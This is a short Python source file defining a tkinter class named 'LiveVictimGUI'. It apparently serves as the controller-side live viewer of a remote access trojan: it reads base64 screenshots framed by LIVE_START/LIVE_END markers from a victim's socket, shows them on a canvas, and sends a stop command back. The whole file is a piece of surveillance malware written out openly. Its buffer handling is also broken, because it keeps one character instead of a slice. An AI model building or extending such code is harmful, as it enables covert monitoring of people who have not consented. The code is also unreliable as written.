import threading
class LiveVictimGUI:
    def __init__(self, client_socket):
        self.client = client_socket
        self.running = True
    def setup(self):
        import tkinter as tk
        self.root = tk.Tk()
        self.root.title("Live View")
        self.root.geometry("900x700")
        self.root.configure(bg="black")
        self.canvas = tk.Canvas(
            self.root,
            bg="black",
            width=850,
            height=600
        )
        self.canvas.pack(pady=10)
        btn_frame = tk.Frame(self.root, bg="black")
        btn_frame.pack(pady=10)
        self.stop_btn = tk.Button(
            btn_frame,
            text="STOP",
            command=self.stop_view,
            bg="red",
            fg="white",
            padx=20
        )
        self.stop_btn.pack()
        self.receive_thread = threading.Thread(
            target=self.receive_frames,
            daemon=True
        )
        self.receive_thread.start()
        self.root.protocol("WM_DELETE_WINDOW", self.stop_view)
        self.root.mainloop()
    def receive_frames(self):
        from PIL import Image,ImageTk
        import io
        import base64
        buffer = ""
        while self.running:
            try:
                data = self.client.recv(65536).decode('utf-8',errors='ignore')
                if not data:
                    break
                buffer += data
                while "LIVE_START" in buffer and "LIVE_END" in buffer:
                    start = buffer.find("LIVE_START")
                    end = buffer.find("LIVE_END")
                    if start!=-1 and end!=-1:
                        img_part = buffer[start+11:end]
                        buffer = buffer[end+9]
                    try:
                        img_data = base64.b64decode(img_part)
                        image = Image.open(io.BytesIO(img_data))
                        image = image.resize((850,600),Image.Resampling.LANCZOS)
                        photo = ImageTk.PhotoImage(image)
                        self.root.after(0,self.update_image,photo) 
                    except:
                        pass
            except:
                pass 
    def update_image(self,photo):
        self.canvas.delete("all")
        self.canvas.create_image(425,300,image=photo,anchor='center')
        self.canvas.image = photo
    def stop_view(self):
        self.running = False
        try:
            self.client.send(b"Live stop\n")
        except:
            pass
        self.root.destroy()